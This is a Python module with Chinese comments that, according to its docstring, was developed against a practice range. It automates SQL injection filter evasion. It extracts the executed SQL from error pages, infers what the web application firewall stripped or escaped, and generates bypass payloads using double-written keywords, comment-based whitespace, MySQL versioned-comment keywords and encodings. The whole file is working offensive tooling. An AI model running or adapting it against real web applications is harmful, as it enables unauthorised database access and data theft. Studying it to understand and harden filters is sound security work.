# -*- coding: utf-8 -*-
"""WAF 现场反推：从报错页回显的「实际执行 SQL」推断过滤规则，并改写 payload。

通用 diff 引擎（2026-10-19 升级，替代原先的 space / kw_once 两条硬编码）：
  1. 从 HTML / JSON / 报错文本中提取实际执行的 SQL，再定位注入片段；
  2. sent payload 与 executed fragment 做 **token 级对齐**（difflib.SequenceMatcher），
     辅以字符级残差分析，推断变换（删除 / 替换 / 转义 / 编码 / 截断 / 大小写）；
  3. 变换算子库覆盖：
       - 空白：全部删除 / 替换为注释 / 部分删除
       - 关键字：删除一次（含双写被吃掉一份）/ 删除全部 / 删除 N 次
       - 引号：反斜杠转义 / 双写转义 / 直接删除
       - 编码：URL / HTML / hex
       - 截断、大小写、标点与注释删除、字符前缀/后缀删除、插入
  4. 按变换生成**有限个改写候选**（原 payload 放最后），供上层逐次试打；
     确定性优先，不依赖 AI。

背景（2026-10-19 某靶场 实测）：
- 靶场把 `select/from/union/where` 各删除一次、禁止空白字符；
- 报错页会回显拼接后的 SQL，人可以据此反推并改写——工具此前只会认
  预定义的 space / kw_once 两类，49920 真页（双写被吃掉一份后只剩单关键字）
  反而识别不出来。
"""
from __future__ import annotations

import html
import json
import re
from difflib import SequenceMatcher
from urllib.parse import quote as _url_quote, unquote as _url_unquote

_KWS = ("select", "from", "union", "where", "and", "or", "order", "by", "limit", "group")

# 删除类变换的逆向候选（按优先级排列；第一条最常用）
_ALT_TOKENS = {
    "--": ("#", "/* */"),
    "#": ("-- ",),
    "/*": ("-- ",),
    "*/": ("-- ",),
    "/**/": ("%09", "%0a"),
    "or": ("||",),
    "and": ("&&",),
    "select": ("/*!50000SELECT*/",),
    "union": ("/*!50000UNION*/",),
    "where": ("/*!50000WHERE*/",),
    "from": ("/*!50000FROM*/",),
    "=": ("LIKE",),
}

# 只做「分词」用途：注释、空白、单词、数字、多字符运算符、逐字符兜底。
_TOKEN_RE = re.compile(
    r"/\*.*?\*/"
    r"|\s+"
    r"|[A-Za-z_][A-Za-z0-9_$]*"
    r"|\d+(?:\.\d+)?"
    r"|<>|<=|>=|!=|::|\|\||&&"
    r"|--"
    r"|#"
    r"|.",
    re.S,
)

_WORD_RE = re.compile(r"[A-Za-z_][A-Za-z0-9_$]*")


# ---------------------------------------------------------------------------
# 提取：报错文本 -> 实际执行 SQL -> 注入片段
# ---------------------------------------------------------------------------

def extract_executed_sql(text: str) -> str | None:
    """从报错页 / JSON / 报错消息里提取实际执行的 SQL。"""
    if not text:
        return None

    # 0) JSON：{"sql": "SELECT ..."} / {"query": "..."}
    m = re.search(r'"(?:sql|query|executed_sql)"\s*:\s*"((?:\\.|[^"\\])*)"',
                  text, re.I)
    if m:
        raw = m.group(1)
        try:
            return json.loads(f'"{raw}"')
        except (ValueError, json.JSONDecodeError):
            return raw

    # 1) <div class="sql">SELECT ...</div> / <pre class="sql">
    m = re.search(r'class=["\'](?:sql|query|executed)[^"\']*["\'][^>]*>\s*'
                  r'(SELECT[^<]{3,2000})', text, re.I | re.S)
    if m:
        return m.group(1).strip()
    m = re.search(r'class=["\'](?:sql|query|executed)[^"\']*["\'][^>]*>\s*'
                  r'(.*?)\s*</', text, re.I | re.S)
    if m:
        block = re.sub(r"<[^>]+>", "", m.group(1)).strip()
        if block:
            return block

    # 2) 报错消息里直接带 SELECT ... FROM ...
    m = re.search(r"(SELECT\s+[^<;\n]{3,1200}?FROM\s+[^<;\n]{1,500})",
                  text, re.I | re.S)
    if m:
        return m.group(1).strip()

    # 3) 仅 LIKE 片段
    m = re.search(r"(LIKE\s+'%[^']{0,800}%')", text, re.I | re.S)
    if m:
        return m.group(1)
    return None


def _candidate_fragments(executed: str) -> list[str]:
    """从执行 SQL 中切出可能的注入片段，交给相似度挑选。"""
    out: list[str] = [executed]

    # LIKE '%...%'：贪婪到最后一个 %'，payload 自身可能含 %
    for pat in (r"LIKE\s+'%(.*)%'", r'LIKE\s+"%(.*)%"'):
        m = re.search(pat, executed, re.I | re.S)
        if m:
            out.append(m.group(1))

    # 任意引号内片段（非贪婪；一条 SQL 可能有多段）
    # LIKE 场景下引号内会带首尾 %，剥掉后再参与相似度比较，避免盖过 LIKE 片段
    for m in re.finditer(r"'([^']{1,2000})'", executed, re.S):
        cand = m.group(1)
        if len(cand) > 2 and cand.startswith("%") and cand.endswith("%"):
            cand = cand[1:-1]
        out.append(cand)
    for m in re.finditer(r'"([^"]{1,2000})"', executed, re.S):
        cand = m.group(1)
        if len(cand) > 2 and cand.startswith("%") and cand.endswith("%"):
            cand = cand[1:-1]
        out.append(cand)

    seen: set[str] = set()
    uniq: list[str] = []
    for cand in out:
        cand = (cand or "").strip()
        if cand and cand not in seen:
            seen.add(cand)
            uniq.append(cand)
    return uniq


def _best_fragment(sent_payload: str, executed: str) -> str:
    """选与 sent payload 最贴合的注入片段（最长公共块 + 长度接近度）。"""
    cands = _candidate_fragments(executed)
    if not cands:
        return executed

    def score(cand: str):
        sm = SequenceMatcher(None, sent_payload, cand, autojunk=False)
        m = sm.find_longest_match(0, len(sent_payload), 0, len(cand))
        return (m.size, -abs(len(cand) - len(sent_payload)))

    return max(cands, key=score)


# ---------------------------------------------------------------------------
# 基础工具
# ---------------------------------------------------------------------------

def fake_double(kw: str) -> str:
    """W → W[:1] + W + W[1:]（一种合法的双写偏移；W 被吃掉后首尾拼回 W）。"""
    return kw[:1] + kw + kw[1:]


def _tokens(text: str) -> list[str]:
    return _TOKEN_RE.findall(text or "")


def _is_word(tok: str) -> bool:
    return bool(_WORD_RE.fullmatch(tok or ""))


def _norm_token(tok: str) -> str:
    return " " if tok.isspace() else tok


def _count_word(text: str, word: str) -> int:
    return len(re.findall(rf"\b{re.escape(word)}\b", text or "", re.I))


def _has_double_write(text: str, kw: str) -> bool:
    """检测任意偏移的双写：token 中删掉一份 kw 后仍等于 kw。

    例：SELSELECTECT（偏移 3）、SSELECTELECT（偏移 1）、FRFROMOM（偏移 2）
    都满足 `tok.replace(kw, "", 1) == kw`。
    """
    kw_l = (kw or "").lower()
    if not kw_l:
        return False
    for tok in _tokens(text):
        if not _is_word(tok):
            continue
        tok_l = tok.lower()
        if kw_l in tok_l and tok_l.replace(kw_l, "", 1) == kw_l:
            return True
    return False


def _is_double_write_token(tok: str) -> bool:
    """判断一个 token 本身是否是某关键字的双写形态（如 SELSELECTECT）。

    双写形态长度为 2N，其中 N 是关键字长度；在 token 内所有长度为 N 的
    子串里找「删掉一份后仍是自己」的那个。
    """
    if not _is_word(tok):
        return False
    tl = tok.lower()
    if len(tl) < 4 or len(tl) % 2:
        return False
    n = len(tl) // 2
    for i in range(n + 1):
        sub = tl[i:i + n]
        if _is_word(sub) and sub in tl and tl.replace(sub, "", 1) == sub:
            return True
    return False


def _token_ops(sent: str, frag: str):
    """token 级对齐：返回 SequenceMatcher 的 opcode（已归一化空白）。"""
    st = [_norm_token(t) for t in _tokens(sent)]
    ft = [_norm_token(t) for t in _tokens(frag)]
    sm = SequenceMatcher(None, st, ft, autojunk=False)
    return list(sm.get_opcodes()), _tokens(sent), _tokens(frag)


# ---------------------------------------------------------------------------
# 推断：变换算子库
# ---------------------------------------------------------------------------

def _detect_global(sent: str, frag: str) -> list[str]:
    """整串级别的简单变换（空白 / 引号 / 编码 / 截断 / 大小写）。"""
    out: list[str] = []
    if not sent or not frag:
        return out

    if sent != frag and sent.lower() == frag.lower():
        out.append("case")

    # 空白（部分空白被删的情况交给 op 级判断，避免把「关键字连同空格一起被删」
    # 误报成「目标吃空格」）
    if re.search(r"\s", sent):
        if re.sub(r"\s+", "", sent) == re.sub(r"\s+", "", frag):
            out.append("space")
        elif re.sub(r"\s+", "/**/", sent).strip() == frag.strip():
            out.append("space_comment")

    # 引号
    if "'" in sent:
        if sent.replace("'", "\\'") == frag:
            out.append("quote_backslash")
        elif sent.replace("'", "''") == frag:
            out.append("quote_double")
        elif sent.replace("'", "") == frag:
            out.append("quote_delete")

    # 编码
    if "%" in frag and _url_unquote(frag) == sent:
        out.append("urlencode")
    if "&" in frag and html.unescape(frag) == sent:
        out.append("htmlencode")
    if re.fullmatch(r"[0-9a-fA-F]+", frag or "") and len(frag) == len(sent) * 2:
        try:
            if bytes.fromhex(frag).decode("utf-8", "ignore") == sent:
                out.append("hexencode")
        except ValueError:
            pass

    # 截断
    if len(frag) < len(sent) and sent.startswith(frag):
        out.append(f"truncate:{len(frag)}")

    return out


def _detect_keywords(sent: str, frag: str) -> list[str]:
    """关键字删除：区分「删一次 / 删全部 / 删 N 次」，并识别任意偏移的双写。"""
    candidates: set[str] = set(_KWS)
    candidates.update(m.group(0).lower()
                      for m in _WORD_RE.finditer(sent or ""))
    once: set[str] = set()
    all_kw: set[str] = set()
    delcount: dict[str, int] = {}

    for kw in sorted(candidates):
        if len(kw) < 2:
            continue
        # 双写 token 本身不是「关键字」，它是另一个关键字的变形；
        # 跳过它，否则会把 SELSELECTECT 误判成被删的关键字。
        if _is_double_write_token(kw):
            continue
        n_s = _count_word(sent, kw)
        n_f = _count_word(frag, kw)
        double_sent = _has_double_write(sent, kw)
        double_frag = _has_double_write(frag, kw)

        # 双写被吃掉一份（真值页只剩单关键字）或双写仍在（合成页）
        if double_sent and (n_f > 0 or double_frag):
            once.add(kw)
            continue
        if n_s <= n_f:
            continue
        diff = n_s - n_f
        if n_s >= 2 and n_f == 0:
            # 只有 sent 里出现 >=2 次且执行侧一次不剩，才敢判「删全部」
            all_kw.add(kw)
        elif diff == 1:
            once.add(kw)
        else:
            delcount[kw] = diff

    out: list[str] = []
    if once:
        out.append("kw_once")
        out.extend(f"kw_once:{kw}" for kw in sorted(once))
    if all_kw:
        out.append("kw_all")
        out.extend(f"kw_all:{kw}" for kw in sorted(all_kw))
    if delcount:
        out.append("kw_delete")
        out.extend(f"kw_delete:{kw}:{n}" for kw, n in sorted(delcount.items()))
    return out


def _detect_op_transforms(sent: str, frag: str, opcodes,
                          stoks: list[str], ftoks: list[str]) -> list[str]:
    """按对齐 opcode 推断删除 / 插入 / 替换类变换。"""
    out: list[str] = []
    ws_sent = len(re.findall(r"\s", sent))
    ws_frag = len(re.findall(r"\s", frag))

    for tag, i1, i2, j1, j2 in opcodes:
        if tag == "equal":
            continue
        st = stoks[i1:i2]
        ft = ftoks[j1:j2]

        if tag == "delete":
            # 只有「纯空白被删、且整体空白数确实减少」才算目标吃空白；
            # 关键字连同周围空格一起被删时不算。
            if (any(t.isspace() for t in st) and ws_frag < ws_sent
                    and not any(_is_word(t) for t in st)):
                out.append("space")
            for tok in st:
                if tok.isspace():
                    continue
                if tok in ("'", '"'):
                    out.append("quote_delete")
                elif tok.startswith("/*") or tok in ("--", "#"):
                    out.append(f"delete_comment:{tok}")
                elif _is_word(tok):
                    if tok.lower() not in _KWS:
                        out.append(f"delete_word:{tok.lower()}")
                elif len(tok) <= 4:
                    n_s = sent.count(tok)
                    n_f = frag.count(tok)
                    if n_f == 0 and n_s >= 1:
                        out.append(f"delete_all:{tok}")
                    else:
                        out.append(f"delete:{tok}")
            continue

        if tag == "insert":
            for tok in ft:
                if tok.isspace():
                    continue
                if tok == "/**/":
                    out.append("space_comment")
                elif tok == "\\":
                    out.append("quote_backslash")
                elif re.fullmatch(r"%[0-9a-fA-F]{2}", tok):
                    out.append("urlencode")
                else:
                    out.append(f"insert:{tok}")
            continue

        # replace
        for s_tok, f_tok in zip(st, ft):
            sl, fl = s_tok.lower(), f_tok.lower()
            if sl == fl:
                continue
            if s_tok.isspace() and f_tok in ("/**/", "+", "%09", "%0a"):
                out.append("space_comment")
            elif s_tok in ("'", '"') and f_tok.startswith("\\"):
                out.append("quote_backslash")
            elif s_tok in ("'", '"') and f_tok == s_tok * 2:
                out.append("quote_double")
            elif _is_word(s_tok) and _is_word(f_tok):
                if fl in sl and sl.replace(fl, "", 1) == fl:
                    out.append(f"kw_once:{fl}")
                elif sl in fl and fl.replace(sl, "", 1) == sl:
                    # 对齐把单关键字配到了双写 token 上，不是新变换
                    continue
                elif sl.startswith(fl):
                    out.append(f"delete_suffix:{sl[len(fl):]}")
                elif sl.endswith(fl):
                    out.append(f"delete_prefix:{sl[:len(sl) - len(fl)]}")
                else:
                    out.append(f"replace_word:{sl}->{fl}")
            elif s_tok.isspace():
                out.append(f"space_replace:{f_tok}")
            else:
                out.append(f"replace:{s_tok}->{f_tok}")
    return out


def _rank(transform: str) -> int:
    if transform.startswith("space"):
        return 0
    if transform.startswith("kw_once"):
        return 1
    if transform.startswith("kw_all"):
        return 2
    if transform.startswith("kw_delete"):
        return 3
    if transform.startswith("quote"):
        return 4
    if transform in ("urlencode", "htmlencode", "hexencode"):
        return 5
    if transform == "case":
        return 6
    if transform.startswith("truncate"):
        return 7
    return 8


def _ordered(transforms: list[str]) -> list[str]:
    seen: set[str] = set()
    out: list[str] = []
    for t in transforms:
        if t and t not in seen:
            seen.add(t)
            out.append(t)
    out.sort(key=_rank)
    return out


def _clean_noise(transforms: list[str]) -> list[str]:
    """去掉被更高层变换解释过的对齐碎片（编码/转义/空白替换后的单字符噪声）。"""
    out = list(transforms)
    enc = {"urlencode", "htmlencode", "hexencode"} & set(out)
    if enc:
        out = [t for t in out
               if not (t.startswith("replace:") or t.startswith("insert:")
                       or t.startswith("space_replace:"))]
    if any(t.startswith("quote_") for t in out):
        out = [t for t in out
               if not (t.startswith("insert:\\")
                       or (t.startswith("replace:") and ("'" in t or '"' in t)))]
    if "space" in out or "space_comment" in out:
        out = [t for t in out if t not in ("insert:/**/", "insert: ")]
    # 单字符 replace 基本是对齐碎片（真实有意义的替换不会只有一个字符）
    out = [t for t in out
           if not (t.startswith("replace:")
                   and len(t.split("->", 1)[0].split(":", 1)[-1]) <= 1)]
    return _ordered(out)


def infer_transforms(sent_payload: str, executed_sql: str) -> list[str]:
    """推断 WAF 变换。返回可解释的算子序列（可能为空）。

    兼容旧调用：仍会返回裸的 "space" / "kw_once"；新增带冒号的明细。
    """
    if not sent_payload or not executed_sql:
        return []
    frag = _best_fragment(sent_payload, executed_sql)
    opcodes, stoks, ftoks = _token_ops(sent_payload, frag)

    raw: list[str] = []
    raw.extend(_detect_global(sent_payload, frag))

    # 截断会制造大量「被删掉」的假象；只保留全局结论，不再做删除/替换推断
    if any(t.startswith("truncate:") for t in raw):
        return _ordered(raw)

    raw.extend(_detect_keywords(sent_payload, frag))
    raw.extend(_detect_op_transforms(sent_payload, frag, opcodes, stoks, ftoks))
    return _clean_noise(raw)


# ---------------------------------------------------------------------------
# 改写：按变换做逆向，生成有限候选
# ---------------------------------------------------------------------------

def _double_first(payload: str, kw: str) -> str:
    """只双写关键字的首次出现（WAF 只删一次时刚好抵消）。"""
    if not payload or not kw:
        return payload
    pat = re.compile(rf"\b{re.escape(kw)}\b", re.I)

    def repl(m):
        w = m.group(0)
        return w[:1] + w + w[1:]

    return pat.sub(repl, payload, count=1)


def _pad_first(payload: str, kw: str, n: int) -> str:
    """删 N 次时的补偿：对首次出现的 kw 连续做 N 次双写。"""
    if not payload or not kw:
        return payload
    pat = re.compile(rf"\b{re.escape(kw)}\b", re.I)

    def repl(m):
        w = m.group(0)
        out = w
        for _ in range(max(1, n)):
            out = out[:1] + out + out[1:]
        return out

    return pat.sub(repl, payload, count=1)


def _replace_all_kw(payload: str, kw: str, alt: str) -> str:
    return re.sub(rf"\b{re.escape(kw)}\b", alt, payload, flags=re.I)


def _dedupe_ordered(cands: list[str], payload: str, cap: int = 8) -> list[str]:
    seen: set[str] = set()
    uniq: list[str] = []
    for c in cands:
        if c not in seen:
            seen.add(c)
            uniq.append(c)
    changed = [c for c in uniq if c != payload]
    same = [c for c in uniq if c == payload]
    return (changed + same)[:cap]


def rewrite_candidates(payload: str, transforms: list[str]) -> list[str]:
    """按变换生成候选改写；首个是主候选，原 payload 排在最后。

    多个候选供上层做有限次试打（以报错变化 / 条件可控为适应度）。
    """
    if not payload or not transforms:
        return [payload]

    ts = set(transforms)
    cands: list[str] = [payload]

    def apply_all(fn) -> None:
        nonlocal cands
        cands = [fn(c) for c in cands]

    def branch(fn) -> None:
        nonlocal cands
        for c in list(cands):
            nc = fn(c)
            if nc not in cands:
                cands.append(nc)
            if len(cands) >= 8:
                break

    # 1) 空白：主选 /**/；备选 + / %09
    if ts & {"space", "space_comment", "space_partial"}:
        apply_all(lambda p: re.sub(r"\s+", "/**/", p))
        branch(lambda p: re.sub(r"\s+", "+", p))
        branch(lambda p: re.sub(r"\s+", "%09", p))

    # 2) 关键字删除一次：双写首次出现
    once_kws = sorted({t.split(":", 1)[1] for t in ts if t.startswith("kw_once:")})
    if "kw_once" in ts and not once_kws:
        once_kws = list(_KWS)
    for kw in once_kws:
        apply_all(lambda p, kw=kw: _double_first(p, kw))

    # 3) 关键字删除 N 次：连续补偿
    for t in sorted(ts):
        if t.startswith("kw_delete:") and t.count(":") == 2:
            _, kw, n = t.split(":")
            try:
                apply_all(lambda p, kw=kw, n=int(n): _pad_first(p, kw, int(n)))
            except ValueError:
                continue

    # 4) 关键字删除全部：双写无效，改用替代写法。
    #    每个关键字的第一替代写成「必须项」，其余作为分支候选，
    #    避免出现只换了一个关键字、另一个仍会被删的半成品。
    all_kws = sorted({t.split(":", 1)[1] for t in ts if t.startswith("kw_all:")})
    if "kw_all" in ts and not all_kws:
        all_kws = list(_KWS)
    for kw in all_kws:
        alts = _ALT_TOKENS.get(kw.lower(), ())
        if not alts:
            continue
        apply_all(lambda p, kw=kw, alt=alts[0]: _replace_all_kw(p, kw, alt))
        for alt in alts[1:]:
            branch(lambda p, kw=kw, alt=alt: _replace_all_kw(p, kw, alt))

    # 5) 编码
    if "urlencode" in ts:
        branch(lambda p: _url_quote(p, safe=""))
    if "htmlencode" in ts:
        branch(lambda p: html.escape(p, quote=True))
    if "hexencode" in ts:
        branch(lambda p: p.encode().hex())

    # 6) 截断
    for t in sorted(ts):
        if t.startswith("truncate:"):
            try:
                n = int(t.split(":", 1)[1])
            except ValueError:
                continue
            branch(lambda p, n=n: p[:n])

    # 7) 标点 / 注释被删除：换替代写法
    for t in sorted(ts):
        if t.startswith("delete_all:") or t.startswith("delete:"):
            tok = t.split(":", 1)[1]
            for alt in _ALT_TOKENS.get(tok.lower(), ()):
                branch(lambda p, tok=tok, alt=alt: p.replace(tok, alt))
        elif t.startswith("delete_comment:"):
            tok = t.split(":", 1)[1]
            for alt in _ALT_TOKENS.get(tok.lower(), ()):
                branch(lambda p, tok=tok, alt=alt: p.replace(tok, alt))

    return _dedupe_ordered(cands, payload)


def rewrite(payload: str, transforms: list[str]) -> str:
    """按变换改写 payload；优先返回有变化的候选。"""
    if not payload or not transforms:
        return payload
    for cand in rewrite_candidates(payload, transforms):
        if cand != payload:
            return cand
    return payload


def infer_and_rewrite_candidates(sent_payload: str, resp_text: str) -> tuple[list[str], list[str]]:
    """返回 (所有有变化的候选, 推断出的变换)，供有限次试打。"""
    executed = extract_executed_sql(resp_text or "")
    if not executed:
        return [], []
    transforms = infer_transforms(sent_payload, executed)
    if not transforms:
        return [], []
    cands = [c for c in rewrite_candidates(sent_payload, transforms)
             if c != sent_payload]
    return cands, transforms


def infer_and_rewrite(sent_payload: str, resp_text: str) -> tuple[str | None, list[str]]:
    """返回 (主改写 payload 或 None, 推断出的变换)。"""
    cands, transforms = infer_and_rewrite_candidates(sent_payload, resp_text)
    return (cands[0] if cands else None), transforms
